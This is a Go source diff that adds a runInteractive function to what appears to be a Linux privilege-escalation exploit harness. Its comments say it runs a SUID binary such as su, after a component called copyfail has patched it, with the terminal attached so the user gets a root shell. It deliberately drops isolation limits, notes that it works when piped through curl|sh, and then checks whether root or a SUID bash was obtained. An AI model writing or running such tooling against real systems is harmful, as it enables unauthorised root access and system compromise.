@@ -146,6 +146,99 @@ func runIsolated(name, dir string, argv []string, hardTimeout time.Duration) run
 	return r
 }
 
+// runInteractive runs a command with stdin/stdout/stderr wired to
+// /dev/tty so the command can spawn an interactive shell. Unlike
+// runIsolated, it does NOT feed /dev/null to stdin (which would make
+// the patched su exit immediately), does NOT wrap in ulimit, and does
+// NOT use Setpgid (the shell must stay in the foreground process group
+// to read the terminal).
+//
+// This is used after copyfail patches a SUID binary (e.g. su): the
+// patched binary is run interactively so the user gets a root shell.
+func runInteractive(name string, argv []string, timeout time.Duration) runResult {
+	r := runResult{name: name, cmd: strings.Join(argv, " ")}
+	if len(argv) == 0 {
+		r.crashed = true
+		r.stderr = "empty command"
+		return r
+	}
+
+	bin, err := exec.LookPath(argv[0])
+	if err != nil {
+		if _, err2 := os.Stat(argv[0]); err2 != nil {
+			r.crashed = true
+			r.stderr = fmt.Sprintf("binary not found: %s", argv[0])
+			return r
+		}
+		bin = argv[0]
+	}
+
+	// Open /dev/tty — the real user terminal. This works even under
+	// curl|sh where os.Stdin is the closed download pipe.
+	tty, ttyErr := os.OpenFile("/dev/tty", os.O_RDWR, 0)
+	if ttyErr != nil {
+		// No TTY available — fall back to runIsolated behavior.
+		// The patched binary won't be interactive, but at least
+		// we'll check if root was achieved.
+		warnf("/dev/tty unavailable for %s — running non-interactive", name)
+		r2 := runIsolated(name, "", argv, timeout)
+		r2.name = name
+		return r2
+	}
+	defer tty.Close()
+
+	c := exec.Command(bin, argv[1:]...)
+	c.Stdin = tty
+	c.Stdout = tty
+	c.Stderr = tty
+	// No Setpgid — shell must stay in foreground pgid.
+	// No ulimit — the shell needs full resources.
+
+	start := time.Now()
+	if err := c.Start(); err != nil {
+		r.crashed = true
+		r.stderr = fmt.Sprintf("start failed: %v", err)
+		r.elapsed = time.Since(start)
+		return r
+	}
+
+	pid := c.Process.Pid
+	doneCh := make(chan error, 1)
+	go func() { doneCh <- c.Wait() }()
+
+	var waitErr error
+	timedOut := false
+	select {
+	case waitErr = <-doneCh:
+	case <-time.After(timeout):
+		timedOut = true
+		killGroup(pid)
+		select {
+		case waitErr = <-doneCh:
+		case <-time.After(5 * time.Second):
+			waitErr = fmt.Errorf("process refused to die after SIGKILL")
+		}
+	}
+
+	r.elapsed = time.Since(start)
+	r.timedOut = timedOut
+	if waitErr != nil {
+		if ee, ok := waitErr.(*exec.ExitError); ok {
+			r.exitCode = ee.ExitCode()
+		} else {
+			r.exitCode = -1
+			r.stderr = waitErr.Error()
+		}
+	}
+	// Check if root was achieved while the interactive shell was running.
+	r.rootAfter = isRootNow()
+	r.suidAfter = isSUIDBash()
+	if !r.rootAfter {
+		r.rootAfter = markerRooted()
+	}
+	return r
+}
+
 // killGroup SIGKILLs the entire process group led by pid, to clean up
 // fork-heavy exploits that may hang.
 func killGroup(pid int) {
